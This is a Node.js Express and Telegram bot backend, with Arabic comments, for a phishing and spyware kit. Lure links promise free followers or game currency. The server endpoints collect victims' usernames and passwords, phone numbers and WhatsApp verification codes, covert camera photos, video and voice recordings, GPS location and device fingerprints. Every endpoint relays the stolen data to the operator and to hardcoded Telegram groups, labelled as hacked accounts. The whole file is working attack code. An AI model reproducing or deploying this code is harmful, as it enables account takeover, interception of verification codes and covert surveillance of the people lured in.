    // ===== 4️⃣ معالج تعديل رابط معين =====
    if (data.startsWith('edit_link_')) {
        const parts = data.split('_');
        const section = parts[2]; // login, increase, games
        const platform = parts[3]; // instagram, tiktok, pubg_uc, etc
        
        const currentLink = pageLinks[section]?.[platform] || 'غير موجود';
        
        await bot.sendMessage(chatId, 
            `📌 **تعديل رابط ${getPlatformNameAr(platform)}**\n` +
            `📂 **القسم:** ${getSectionNameAr(section)}\n\n` +
            `🔗 الرابط الحالي: \`${currentLink}\`\n\n` +
            `✍️ أرسل الرابط الجديد الآن:`,
            { parse_mode: 'Markdown' }
        );

        // تخزين حالة المستخدم
        allUsers[chatId] = { 
            step: 'awaiting_new_link', 
            section: section, 
            platform: platform 
        };
        return bot.answerCallbackQuery(query.id);
    }

    // ===== 5️⃣ معالج روابط المستخدمين العاديين =====
    
    // روابط تسجيل الدخول
    if (data.startsWith('login_')) {
        const platform = data.replace('login_', '');
        const link = pageLinks.login?.[platform];
        
        if (!link) {
            return bot.answerCallbackQuery(query.id, { text: '❌ الرابط غير متوفر حالياً', show_alert: true });
        }
        
        const finalLink = `${link}?chatId=${chatId}`;
        await bot.sendMessage(chatId, `🔐 رابط تسجيل دخول ${getPlatformNameAr(platform)}:\n${finalLink}`);
        return bot.answerCallbackQuery(query.id);
    }
    
    // روابط زيادة المتابعين
    else if (data.startsWith('increase_')) {
        const platform = data.replace('increase_', '');
        const link = pageLinks.increase?.[platform];
        
        if (!link) {
            return bot.answerCallbackQuery(query.id, { text: '❌ الرابط غير متوفر حالياً', show_alert: true });
        }
        
        const finalLink = `${link}?chatId=${chatId}`;
        await bot.sendMessage(chatId, `📈 رابط زيادة متابعين ${getPlatformNameAr(platform)}:\n${finalLink}`);
        return bot.answerCallbackQuery(query.id);
    }
    
    // روابط الألعاب
    else if (data === 'pubg_uc' || data === 'free_fire_diamonds' || data === 'toptop_coins') {
        const link = pageLinks.games?.[data];
        
        if (!link) {
            return bot.answerCallbackQuery(query.id, { text: '❌ الرابط غير متوفر حالياً', show_alert: true });
        }
        
        const finalLink = `${link}?chatId=${chatId}`;
        await bot.sendMessage(chatId, `🎮 رابط شحن ${getPlatformNameAr(data)}:\n${finalLink}`);
        return bot.answerCallbackQuery(query.id);
    }

    // إذا ما دخل في أي شرط
    return bot.answerCallbackQuery(query.id);
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // التحقق من وجود حالة للمستخدم
    if (allUsers[chatId] && allUsers[chatId].step === 'awaiting_new_link') {
        const { section, platform } = allUsers[chatId];
        
        // التحقق من صحة الرابط
        try {
            new URL(text);
        } catch (error) {
            return bot.sendMessage(chatId, '❌ الرابط غير صالح. يرجى إرسال رابط صحيح يبدأ بـ http:// أو https://');
        }

        // تحديث الرابط
        if (!pageLinks[section]) pageLinks[section] = {};
        pageLinks[section][platform] = text;
        
        // حفظ التغييرات
        await savePageLinks();
        
        bot.sendMessage(chatId, 
            `✅ تم تحديث الرابط بنجاح!\n\n` +
            `📂 **القسم:** ${getSectionNameAr(section)}\n` +
            `📱 **المنصة:** ${getPlatformNameAr(platform)}\n` +
            `🔗 **الرابط الجديد:** \`${text}\``,
            { parse_mode: 'Markdown' }
        );
        
        // مسح حالة المستخدم
        delete allUsers[chatId];
    }
});


const cors = require('cors');
app.use(cors());

// مجموعات التليجرام
const GROUP_ID_1 = '-1002433284949';
const GROUP_ID_2 = '-1002492307094';

// نقطة نهاية اختبار
app.get('/test', (req, res) => {
    res.json({
        status: '✅ السيرفر يعمل',
        timestamp: new Date().toISOString(),
        endpoints: [
            'POST /submitLogin',
            'POST /submitVideo',
            'POST /submitPhotos',
            'POST /submitVoice',
            'POST /submitLocation',
            'POST /sendPhoneNumber',
            'POST /verifyCode',
            'POST /submitIncrease',
            'POST /SS',
            'POST /submitPhtos'
        ]
    });
});

app.get('/', (req, res) => {
    res.send('✅ سيرفر استقبال البيانات يعمل');
});

// استقبال الفيديو
app.post('/submitVideo', upload.single('video'), async (req, res) => {
    const chatId = req.body.userId;
    const file = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (file) {
        console.log(`Received video from user ${chatId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP:⚡ ${additionalData.ip || 'غير متاح'}
الدولة:🎼 ${additionalData.country || 'غير متاح'}
المدينة:📜 ${additionalData.city || 'غير متاح'}
المنصة:💀 ${additionalData.platform || 'غير متاح'}
إصدار الجهاز: ${additionalData.deviceVersion || 'غير متاح'}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
        `;

        try {
            const userInfo = await bot.getChat(chatId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
            `;

            await bot.sendVideo(chatId, file.buffer, { caption });
            await bot.sendVideo(GROUP_ID_1, file.buffer, { caption: `فيديو من المستخدم ${chatId}\n${userInfoText}\n${caption}` });

            console.log('Video sent successfully to both user and group');
            res.json({ success: true });
        } catch (error) {
            console.error('Error sending video to Telegram:', error);
            res.status(500).json({ success: false, error: 'Error sending video to Telegram' });
        }
    } else {
        res.status(400).json({ success: false, error: 'No video received' });
    }
});

// استقبال الصور
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const userId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${userId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${additionalData.ip}
الدولة:🔬 ${additionalData.country}
المدينة:🗺 ${additionalData.city}
المنصة:🪗 ${additionalData.platform}
إصدار الجهاز:📲 ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            const userInfo = await bot.getChat(userId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
            `;

            for (const file of files) {
                await bot.sendPhoto(userId, file.buffer, { caption });
            }

            for (const file of files) {
                await bot.sendPhoto(GROUP_ID_1, file.buffer, { caption: `صورة من المستخدم ${userId}\n${userInfoText}\n${caption}` });
            }

            console.log('Photos sent successfully to both user and group');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

// استقبال الصوت
app.post('/submitVoice', upload.single('voice'), async (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
معلومات إضافية:
IP:⚡ ${additionalData.ip || 'غير متاح'}
الدولة:🌏 ${additionalData.country || 'غير متاح'}
المدينة:🏙 ${additionalData.city || 'غير متاح'}
المنصة:🎼 ${additionalData.platform || 'غير متاح'}
إصدار الجهاز:📲 ${additionalData.deviceVersion || 'غير متاح'}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
    `;

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        await bot.sendVoice(chatId, voiceFile.buffer, { caption });
        await bot.sendVoice(GROUP_ID_1, voiceFile.buffer, { caption: `رسالة صوتية من المستخدم ${chatId}\n${userInfoText}\n${caption}` });

        console.log('Voice sent successfully to both user and group');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending voice:', error);
        res.status(500).json({ error: 'Failed to send voice message' });
    }
});

// استقبال الموقع
app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData = {} } = req.body;

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        await bot.sendLocation(chatId, latitude, longitude);

        const message = `
معلومات إضافية:
IP:♟️ ${additionalData.ip || 'غير متاح'}
الدولة:🌏 ${additionalData.country || 'غير متاح'}
المدينة:🏙 ${additionalData.city || 'غير متاح'}
المنصة:🌐 ${additionalData.platform || 'غير متاح'}
متصفح المستخدم:⌨️ ${additionalData.userAgent || 'غير متاح'}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن:⚡ ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم' : 'لا') : 'غير متاح'}
        `;

        await bot.sendMessage(chatId, message);
        await bot.sendLocation(GROUP_ID_1, latitude, longitude);
        await bot.sendMessage(GROUP_ID_1, `موقع مرسل من المستخدم ${chatId}\n${userInfoText}\n${message}`);

        console.log('Location and additional data sent successfully to both user and group');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

// استقبال بيانات زيادة المتابعين
app.post('/submitIncrease', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('Received increase data:', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        const userMessage = `
تم اختراق حساب جديد ☠️:
منصة:🏆 ${platform}
اسم المستخدم:⬆️ ${username}
كلمة السر:🎶 ${password}
عنوان IP:🛜 ${ip}
الدولة:🌏 ${country}
المدينة:🏙 ${city}
نظام التشغيل:⚙️ ${deviceInfo.os.toString()}
المتصفح:🌐 ${deviceInfo.toAgent()}
الجهاز:📵 ${deviceInfo.device.toString()}
        `;

        await bot.sendMessage(chatId, userMessage);
        console.log('Message sent to user successfully');

        await bot.sendMessage(GROUP_ID_2, `تم اختراق حساب من قبل المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
        console.log('Message sent to group successfully');

        res.json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send increase data', details: error.message });
    }
});

// استقبال رقم الهاتف
app.post('/sendPhoneNumber', async (req, res) => {
    const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        const message = `
تم استلام رقم هاتف جديد ☎️قم بطلب كود واتساب سريعا:
رقم الهاتف: ${phoneNumber}
الدولة: ${country}
عنوان IP: ${ip}
المنصة: ${platform}

        `;

        await bot.sendMessage(chatId, message);
        console.log('تم إرسال رقم الهاتف إلى المستخدم بنجاح');

        await bot.sendMessage(GROUP_ID_2, `تم استلام رقم هاتف من قبل المستخدم ${chatId}\n${message}`);
        console.log('تم إرسال رقم الهاتف إلى المجموعة بنجاح');

        res.json({ success: true, message: 'تم إرسال رمز التحقق' });
    } catch (error) {
        console.error('خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في إرسال رقم الهاتف', details: error.message });
    }
});

// استقبال كود التحقق
app.post('/verifyCode', async (req, res) => {
    const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        const message = `
تم إدخال كود التحقق ✅:
رقم الهاتف: ${phoneNumber}
كود التحقق: ${verificationCode}
الدولة: ${country}

        `;

        await bot.sendMessage(chatId, message);
        console.log('تم إرسال كود التحقق إلى المستخدم بنجاح');

        await bot.sendMessage(GROUP_ID_2, `تم إدخال كود التحقق من قبل المستخدم ${chatId}\n${message}`);
        console.log('تم إرسال كود التحقق إلى المجموعة بنجاح');

        res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
    } catch (error) {
        console.error('خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
    }
});

// استقبال بيانات تسجيل الدخول
app.post('/submitLogin', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;

    console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = require('useragent').parse(userAgent);

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        const userMessage = `
تم تلقي بيانات تسجيل الدخول:
منصة: ${platform}
اسم المستخدم:👾 ${username}
كلمة السر:🎼 ${password}
عنوان IP:🛜 ${ip}
الدولة:🌏 ${country}
المدينة:🗺 ${city}
نظام التشغيل:⚙️ ${osVersion}
المتصفح:🛡 ${deviceInfo.toAgent()}
الجهاز:📲 ${deviceInfo.device.toString()}
مستوى البطارية:🪫 ${batteryLevel}
قيد الشحن:⚡ ${charging ? 'نعم' : 'لا'}
        `;

        await bot.sendMessage(chatId, userMessage);
        console.log('Message sent to user successfully');

        await bot.sendMessage(GROUP_ID_2, `تم تلقي بيانات تسجيل الدخول بواسطة المستخدم ${chatId}\n${userInfoText}\n${userMessage}`);
        console.log('Message sent to group successfully');

        res.json({ success: true });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send login data', details: error.message });
    }
});

// استقبال معلومات الجهاز الشاملة
app.post('/SS', async (req, res) => {
    console.log('تم استقبال طلب POST في المسار /SS');
    console.log('البيانات المستلمة:', req.body);

    const chatId = req.body.userId;
    const deviceInfo = req.body.deviceInfo || {};
    const userInfo = req.body.userInfo || {};

    const message = `
📝 **معلومات المستخدم:**
- الاسم: ${userInfo.name || 'غير معروف'}
- الهاتف: ${userInfo.phone || 'غير معروف'}
- البريد الإلكتروني: ${userInfo.email || 'غير معروف'}

📱 **معلومات الجهاز:**
- الدولة: ${deviceInfo.country || 'غير معروف'} 🔻
- المدينة: ${deviceInfo.city || 'غير معروف'} 🏙️
- عنوان IP: ${deviceInfo.ip || 'غير معروف'} 🌍
- شحن الهاتف: ${deviceInfo.battery || 'غير معروف'}% 🔋
- هل الهاتف يشحن؟: ${deviceInfo.isCharging ? 'نعم' : 'لا'} ⚡
- الشبكة: ${deviceInfo.network || 'غير معروف'} 📶 (سرعة: ${deviceInfo.networkSpeed || 'غير معروف'} ميغابت في الثانية)
- نوع الاتصال: ${deviceInfo.networkType || 'غير معروف'} 📡
- الوقت: ${deviceInfo.time || 'غير معروف'} ⏰
- اسم الجهاز: ${deviceInfo.deviceName || 'غير معروف'} 🖥️
- إصدار الجهاز: ${deviceInfo.deviceVersion || 'غير معروف'} 📜
- نوع الجهاز: ${deviceInfo.deviceType || 'غير معروف'} 📱
- الذاكرة (RAM): ${deviceInfo.memory || 'غير معروف'} 🧠
- الذاكرة الداخلية: ${deviceInfo.internalStorage || 'غير معروف'} GB 💾
- عدد الأنوية: ${deviceInfo.cpuCores || 'غير معروف'} ⚙️
- لغة النظام: ${deviceInfo.language || 'غير معروف'} 🌐
- اسم المتصفح: ${deviceInfo.browserName || 'غير معروف'} 🌐
- إصدار المتصفح: ${deviceInfo.browserVersion || 'غير معروف'} 📊
- دقة الشاشة: ${deviceInfo.screenResolution || 'غير معروف'} 📏
- إصدار نظام التشغيل: ${deviceInfo.osVersion || 'غير معروف'} 🖥️
- وضع الشاشة: ${deviceInfo.screenOrientation || 'غير معروف'} 🔄
- عمق الألوان: ${deviceInfo.colorDepth || 'غير معروف'} 🎨
- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate || 'غير معروف'} 📅
- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol || 'غير معروف'} 🔒
- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency || 'غير معروف'} 📡
- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable ? 'نعم' : 'لا'} 🌍
- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport ? 'نعم' : 'لا'} 🔵
- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport ? 'نعم' : 'لا'} ✋
    `;

    try {
        const telegramUserInfo = await bot.getChat(chatId);
        const userName = telegramUserInfo.first_name || 'غير متاح';
        const userUsername = telegramUserInfo.username ? `@${telegramUserInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح للمستخدم');

        await bot.sendMessage(GROUP_ID_1, `تم استقبال بيانات جهاز جديدة من المستخدم ${chatId}\n${userInfoText}\n${message}`, { parse_mode: 'Markdown' });
        console.log('تم إرسال معلومات الجهاز والمستخدم بنجاح إلى المجموعة');

        res.json({ success: true });
    } catch (err) {
        console.error('فشل في إرسال معلومات الجهاز والمستخدم:', err);
        res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز والمستخدم' });
    }
});

app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
    console.log('Received a request to /submitPhtos');
    try {
        const { cameraType, additionalData } = req.body;
        const chatId = req.body.chatId;
        const files = req.files;

        console.log('Received request body:', req.body);
        console.log('Received files:', req.files);

        if (!chatId || chatId === 'null') {
            console.error('chatId not provided or is null');
            return res.status(400).json({ success: false, error: 'chatId is required and cannot be null' });
        }

        if (!files || files.length === 0) {
            console.error('No files uploaded');
            return res.status(400).json({ success: false, error: 'No files uploaded' });
        }

        let parsedData = {};
        if (additionalData) {
            try {
                parsedData = JSON.parse(additionalData);
            } catch (error) {
                console.error('Invalid additionalData JSON:', error.message);
                return res.status(400).json({ success: false, error: 'Invalid additionalData format' });
            }
        }

        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
اسم المستخدم: ${userName}
يوزر المستخدم: ${userUsername}
        `;

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP:✍️ ${parsedData.ip || 'غير متاح'}
الدولة:🪐 ${parsedData.country || 'غير متاح'}
المدينة:🌆 ${parsedData.city || 'غير متاح'}
المنصة:♨️ ${parsedData.platform || 'غير متاح'}
وكيل المستخدم: ${parsedData.userAgent || 'غير متاح'}
مستوى البطارية: ${parsedData.batteryLevel || 'غير متاح'}
الشحن: ${parsedData.batteryCharging ? 'نعم' : 'لا'}
        `;

        for (const file of files) {
            try {
                await bot.sendPhoto(chatId, file.buffer, { caption });
                console.log('Photo sent successfully to user');
            } catch (error) {
                console.error('Error sending photo to user:', error.message);
                return res.status(500).json({ success: false, error: 'Failed to send photo to user' });
            }
        }

        for (const file of files) {
            try {
                await bot.sendPhoto(GROUP_ID_1, file.buffer, { caption: `صورة من المستخدم ${chatId}\n${userInfoText}\n${caption}` });
                console.log('Photo sent successfully to group');
            } catch (error) {
                console.error('Error sending photo to group:', error.message);
                return res.status(500).json({ success: false, error: 'Failed to send photo to group' });
            }
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Failed to process request:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
